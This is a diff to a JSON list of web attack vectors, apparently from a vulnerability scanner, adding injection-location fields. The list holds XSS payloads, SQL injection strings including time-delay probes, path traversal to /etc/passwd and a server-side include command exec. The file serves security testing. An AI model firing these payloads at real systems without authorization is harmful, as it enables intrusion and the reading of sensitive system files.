@@ -1,17 +1,20 @@
 [
 {
 	"Vector":"\"><img src=x onerror=alert(4)>",
-	"Test":"<img src=x onerror=alert(4)>"
+	"Test":"<img src=x onerror=alert(4)>",
+	"Section":"header,urlquery"
 },
 {
 	"Vector":"' and '1'='1' --",
 	"SqlInjection":true
 },
 {
-	"Vector":"</script><script>alert(435)</script>"
+	"Vector":"</script><script>alert(435)</script>",
+	"Section":"header,urlquery"
 },
 {
-	"Vector":"<zq>"
+	"Vector":"<zq>",
+	"Section":"header,urlquery"
 },
 {
 	"Vector":"%3czq%3d",
@@ -19,26 +22,30 @@
 },
 {
 	"Vector":"%253czq%253d",
-	"Test":"<zq>"
+	"Test":"<zq>",
+	"Section":"header,urlquery"
 },
 {
 	"Vector":"\"`]}zq>\\x3czq<zq/\\zq\\\"<zq>%22%3czq>//",
-	"Test":"<zq"
+	"Test":"<zq",
+	"Section":"header,urlquery"
 },
 {
 	"Vector":"\\zq\\\"<zq>%22%3czq>//",
-	"Test":"<zq"
+	"Test":"<zq",
+	"Section":"header,urlquery"
 },
 {
 	"Vector":"%22%3czq>//",
 	"Test":"zq>"
 },
 {
-	"Vector":"\" style=\"mm\""
+	"Vector":"\" style=\"zq\""
 },
 {
 	"Vector":"¼script¾alert(324)¼/script¾",
-	"Test":"<script>alert(324)</script>"
+	"Test":"<script>alert(324)</script>",
+	"Section":"header,urlquery"
 },
 {
 	"Vector":"/etc/passwd"
@@ -60,26 +67,41 @@
 	"Test":"<zq"
 },
 {
-	"Vector":"'';!--\"<XSS>=&{()}"
+	"Vector":"'';!--\"<XSS>=&{()}",
+	"Section":"header,urlquery"
 },
 {
 	"Vector":"../../../../../../../../../etc/passwd"
 },
 {
-	"Vector":"<!--#exec cmd=\"ls\" -->"
+	"Vector":"<!--#exec cmd=\"ls\" -->",
+	"Section":"header,urlquery"
 },
 {
 	"Vector":"\"'qqqq"
 },
 {
-	"Vector":"><IMG SRC=\"jav&#x09;ascript:alert(435);\">"
+	"Vector":"><IMG SRC=\"jav&#x09;ascript:alert(435);\">",
+	"Section":"header,urlquery"
 },
 {
 	"Vector":"1; WAIT FOR DELAY '00:00:15'",
 	"SqlInjection":true
 },
 {
+	"Vector":"1\"; WAIT FOR DELAY '00:00:15'",
+	"SqlInjection":true
+},
+{
 	"Vector":"1-BENCHMARK(100000000, rand())",
 	"SqlInjection":true
+},
+{
+	"Vector":"1",
+	"Section":"urlsegment"
+},
+{
+	"Vector":"-1",
+	"Section":"urlsegment"
 }
 ]
